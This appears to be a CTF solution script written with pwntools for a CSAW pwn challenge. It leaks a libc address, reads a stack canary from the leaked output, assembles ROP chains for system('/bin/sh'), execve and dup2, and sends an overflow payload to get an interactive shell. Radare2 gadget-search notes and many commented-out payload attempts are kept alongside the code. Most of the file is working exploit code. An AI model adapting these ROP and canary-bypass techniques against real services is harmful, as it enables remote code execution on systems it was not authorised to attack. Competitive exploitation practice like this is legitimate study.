#!/usr/bin/env python
from pwn import *

p = remote('pwn.chal.csaw.io', 8002)

p.sendline('1')

r = 'Reference:0x([0-9a-f]*)\n'
has_puts_leak = p.recvregex(r)
print(has_puts_leak)
puts_leak = int(re.findall(r, has_puts_leak)[0], 16)
print('puts_leak: %x' % (puts_leak,))

'''
0x00000000004012e3 : pop rdi ; ret
0x00000000004012e1 : pop rsi ; pop r15 ; ret
'''
'''
[0x004012e1]> pd 3
            0x004012e1      5e             popq %rsi
            0x004012e2      415f           popq %r15
            0x004012e4      c3             retq
'''

'''
[0x00022050]> / /bin/sh
Searching 7 bytes from 0x00000270 to 0x003c42c0: 2f 62 69 6e 2f 73 68
Searching 7 bytes in [0x270-0x3c42c0]
hits: 1
0x0017c8c3 hit1_0 "/bin/sh"
[0x00022050]> f~system | grep sym.system
0x00046590 45 sym.system
[0x00022050]> f~sym.puts
0x0006fd60 399 sym.puts
0x000fee00 1085 sym.putspent
0x00100830 555 sym.putsgent
[0x00034e43]> f~sym.dup2
0x000ebe90 33 sym.dup2
'''
'''
libc:
0x0000000000022b9a : pop rdi ; ret
0x0000000000024885 : pop rsi ; ret
0x0000000000001b8e : pop rdx ; ret
0x000000000001b290 : pop rax ; ret
0x000000000000028f : ret
0x0000000000108099 : pop rdx ; pop rsi ; ret
0x00000000000aebdf : sub esp, eax ; pop rbp ; mov eax, r12d ; pop r12 ; ret
----
[0x0001ff6a]> "/a syscall; ret"
Searching 3 bytes in [0x270-0x3c42c0]
hits: 9
0x000c1d05 hit4_0 0f05c3
0x000c1d15 hit4_1 0f05c3
0x000c1d25 hit4_2 0f05c3
0x000c1d35 hit4_3 0f05c3
0x000c1d45 hit4_4 0f05c3
0x000c1f45 hit4_5 0f05c3
0x000eb375 hit4_6 0f05c3
0x000fa7f5 hit4_7 0f05c3
0x001136c8 hit4_8 0f05c3
-----
#define __NR_dup2 33
#define __NR_execve 59
'''

libc_base = (puts_leak + 0x500) - 0x0006fd60
print(libc_base)
print(hex(libc_base))

pack = lambda x: __import__('struct').pack('<Q', x)

system = pack(libc_base + 0x00046590)
libc_dup2 = pack(libc_base + 0x000ebe90)
print('len(system): %d' % len(system))
binsh = pack(libc_base + 0x0017c8c3)
rsi_r15 = pack(0x00000000004012e1)
ret = pack(0x004012e4)

libc_ret = pack(libc_base + 0x000000000000028f)
rax = pack(libc_base + 0x000000000001b290)
rdx = pack(libc_base + 0x0000000000001b8e)
rsi = pack(libc_base + 0x0000000000024885)
rdi = pack(libc_base + 0x0000000000022b9a)
rdx_rdi = pack(libc_base + 0x0000000000108099)
subesp_poppop = pack(libc_base + 0x00000000000aebdf)
syscallret = pack(libc_base + 0x000c1d05)

'''
[0x000c1d05]> /x ebfe
Searching 2 bytes in [0x270-0x3c42c0]
hits: 38
0x00034e43 hit5_0 ebfe
0x0004df79 hit5_1 ebfe
0x00055b9e hit5_2 ebfe
0x0006ec77 hit5_3 ebfe
0x00072af7 hit5_4 ebfe
0x000856b3 hit5_5 ebfe
0x000c28f6 hit5_6 ebfe
0x000c4a9d hit5_7 ebfe
0x000dccd1 hit5_8 ebfe
0x000e6ba8 hit5_9 ebfe
0x000ed59c hit5_10 ebfe
0x000ef601 hit5_11 ebfe
0x00105238 hit5_12 ebfe
0x00112e76 hit5_13 ebfe
0x00116d21 hit5_14 ebfe
0x00127d98 hit5_15 ebfe
0x00128a0a hit5_16 ebfe
0x00128d9a hit5_17 ebfe
0x00134200 hit5_18 ebfe
0x00152bf1 hit5_19 ebfe
0x00152df1 hit5_20 ebfe
0x00152ff1 hit5_21 ebfe
0x001531f1 hit5_22 ebfe
0x001533f1 hit5_23 ebfe
0x001535f1 hit5_24 ebfe
0x001537f1 hit5_25 ebfe
0x001539f1 hit5_26 ebfe
0x00153bf1 hit5_27 ebfe
0x00153df1 hit5_28 ebfe
0x00153ff1 hit5_29 ebfe
0x001541f1 hit5_30 ebfe
0x001543f1 hit5_31 ebfe
0x001545f1 hit5_32 ebfe
0x001547f1 hit5_33 ebfe
0x0015a631 hit5_34 ebfe
0x0015ea81 hit5_35 ebfe
0x001764f1 hit5_36 ebfe
0x001765ca hit5_37 ebfe
'''
dup2 = lambda fd: rax+pack(33)+rdi+pack(fd)+ rsi+pack(1)+syscallret+ rax+pack(33)+rsi+pack(0)+syscallret
ret2dup2 = lambda fd: rdi+pack(fd)+rsi+pack(1)+libc_dup2 +rdi+pack(fd)+rsi+pack(0)+libc_dup2
ebfe = pack(libc_base + 0x00134200)

execve_binsh = rax+pack(59)+rdx_rdi+pack(0)+binsh+rsi+pack(0)+syscallret

ret2system = rdi + binsh + system

p.sendline('2')
p.sendline('ABCD')
has_cookie = []
has_cookie.append(p.recvregex('-Tutorial-'))
has_cookie.append(p.recvregex('-Tutorial-'))
print(repr(has_cookie))
"""
def tmp(s):
    '''
>>> s = '\n1.Manual\n2.Practice\n3.Quit\n>Time to test your exploit...\n>ABCD\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\xe8asm\xd8\xba\x10.\x849-Tutorial-'
>>> s.index('ABCD')
59
>>> s[s.index('ABCD')]
'A'
>>> s[s.index('ABCD'):]
'ABCD\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\xe8asm\xd8\xba\x10.\x849-Tutorial-'
>>> s[s.index('ABCD'):].index('-')
324
>>> x = s[s.index('ABCD'):].index('-')
>>> s[x-8:x]
'\x00\x00\x00\x00\x00\x00\x00\x00'
>>> s[s.index('ABCD'):][x-8:x]
'sm\xd8\xba\x10.\x849'
    '''
    x = s[s.index('ABCD'):].index('-')
    print(repr(x))
    return s[s.index('ABCD'):][x-8:x]

cookie = tmp(has_cookie[1])
print(repr(cookie))
"""

'''
>>> s = '\n1.Manual\n2.Practice\n3.Quit\n>Time to test your exploit...\n>ABCD\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\xe8asm\xd8\xba\x10.\x849-Tutorial-'
>>> t = s[s.index('ABCD'):]
>>> t[0x144-8:0x144]
'sm\xd8\xba\x10.\x849'
'''
prefix = has_cookie[1][has_cookie[1].index('ABCD'):]
print(repr(prefix[:0x144]))

entry0 = pack(0x00400c90)

p.sendline('2')

#p.send(ret*((0x1cc-len(ret2system))/8))
#p.send(pack(puts_leak)*(0x1cc/8))
#p.send(pack(0x4142434445464748)*(0x1cc/8))
#p.send(cookie*((0x144-8)/8)+ret*20+ret2system)
#p.send(cookie*((0x144-8)/8)+entry0*2)
#p.send(cookie*((0x144-8)/8)+pack(puts_leak)*20)
print(repr(ret2system))
print(repr(execve_binsh))
#p.send(prefix[:0x144]+ret*20+ret2system)
#p.send(prefix[:0x144]+libc_ret*20+execve_binsh)
#p.send(prefix[:0x144]+"A")
#p.send(prefix[0x144]+ebfe*10)
#p.send(prefix[:0x144])
cookie = prefix[0x144-12:0x144-4]
print(repr(cookie))
print(cookie.encode('hex'))
#p.send("A"*0x138 + cookie + ebfe + execve_binsh)
#p.send(prefix[:0x140] + ebfe*2)
#p.send("A"*0x138 + cookie + ebfe + dup2(9) + execve_binsh)
#p.send(prefix[:0x140] + ebfe + dup2(3) + ret2system + ebfe*2)

payload = list("A"*0x1cc)
def augment(offset, x):
    global payload
    payload[offset:offset+len(x)] = x
payload[0x138:0x140] = prefix[0x138:0x140]
#augment(0x148, ebfe)
augment(0x148, ret2dup2(4)+ret2system)
"""
augment(0x148+8*0, rax)
augment(0x148+8*1, pack(0x140-32))
#augment(0x148+16, ebfe)
augment(0x148+8*2, subesp_poppop)
augment(0, ebfe*20)
"""
print(repr(payload))
p.send(''.join(payload))

p.interactive()


